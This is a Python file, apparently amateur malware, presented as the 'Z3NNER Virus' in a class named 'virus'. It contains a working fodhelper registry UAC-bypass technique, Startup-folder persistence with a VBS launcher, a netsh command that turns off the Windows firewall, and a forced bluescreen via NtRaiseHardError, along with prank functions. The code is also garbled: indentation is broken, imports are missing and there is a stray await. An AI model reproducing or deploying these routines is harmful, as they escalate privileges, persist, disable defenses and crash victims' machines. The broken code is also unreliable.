"""
Made By A ZoomSquad Member: Z3N
"""

from wallpaper import set_wallpaper, get_wallpaper
import urllib.request
from PIL import Image
from ctypes import * 
import ctypes.wintypes
import threading
import win32com.client as wincl
import os

class virus:

def volumeup():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
    
  def wallpaperchanger():
    path = os.path.join(os.getenv('TEMP') + r"\temp.jpg")
    await message.attachments[0].save(path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
    
  def DisplayInfection():
    MB_YESNO = 0x04
    MB_HELP = 0x4000
    ICON_STOP = 0x10
    def mess():
      ctypes.windll.user32.MessageBoxW(0, "Hey Kind Sir You Have Been Infected By The Z3NNER Virus :)", "Error", MB_HELP | MB_YESNO | ICON_STOP) #Show message box
      import threading
      messa = threading.Thread(target=mess)
      messa._running = True
      messa.daemon = True
      messa.start()
      import win32con
      import win32gui
      def get_all_hwnd(hwnd,mouse):
        def winEnumHandler(hwnd, ctx):
          if win32gui.GetWindowText(hwnd) == "Error":
            win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
            win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
            win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  
            win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
              return None
            else:
              pass
        if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
          win32gui.EnumWindows(winEnumHandler,None)
          win32gui.EnumWindows(get_all_hwnd, 0)
  def UacBypass:
    def isAdmin():
      try:
        is_admin = (os.getuid() == 0)
      except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
          return is_admin
    if isAdmin():
      print('LOL')
    else:
      class disable_fsr():
        disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
        revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
        def __enter__(self):
          self.old_value = ctypes.c_long()
          self.success = self.disable(ctypes.byref(self.old_value))
        def __exit__(self, type, value, traceback):
          if self.success:
            self.revert(self.old_value)
            isexe=False
          if (sys.argv[0].endswith("exe")):
            isexe=True
          if not isexe:
            test_str = sys.argv[0]
            current_dir = inspect.getframeinfo(inspect.currentframe()).filename
            cmd2 = current_dir
            create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
            os.system(create_reg_path)
            create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
            os.system(create_trigger_reg_key) 
            create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start python """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
            os.system(create_payload_reg_key)
          else:
            test_str = sys.argv[0]
            current_dir = test_str
            cmd2 = current_dir
            create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
            os.system(create_reg_path)
            create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
            os.system(create_trigger_reg_key) 
            create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
            os.system(create_payload_reg_key)
          with disable_fsr():
            os.system("fodhelper.exe")  
          time.sleep(2)
          remove_reg = """ powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force """
          os.system(remove_reg)

  def SaysSum:
    speak = wincl.Dispatch("SAPI.SpVoice")
    speak.Speak("SphinxNet ontop!")

  def StartUp():
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin == True:  
      path = sys.argv[0]
      isexe=False
    if (sys.argv[0].endswith("exe")):
      isexe=True
    if isexe:
      os.system(fr'copy "{path}" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /Y' )
    else:
      os.system(r'copy "{}" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs" /Y'.format(path))
      e = r"""
    Set objShell = WScript.CreateObject("WScript.Shell")
    objShell.Run "cmd /c cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\ && python {}", 0, True
    """.format(os.path.basename(sys.argv[0]))
      with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.vbs".format(os.getenv("USERNAME")), "w") as f:
        f.write(e)
        f.close()

  def disablefirewall():
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin == True:
      os.system(r"NetSh Advfirewall set allprofiles state off")
  def bluescreen():
     ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))      ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6,      ctypes.byref(ctypes.wintypes.DWORD()))
    

  def IfTaskManagerIsOpen():
    for process in f.Win32_Process():
      if "chrome.exe" == process.Name:
          virus.bluescreen()
          flag = 1
          break
      if flag == 0:
          print("Application is not Running")


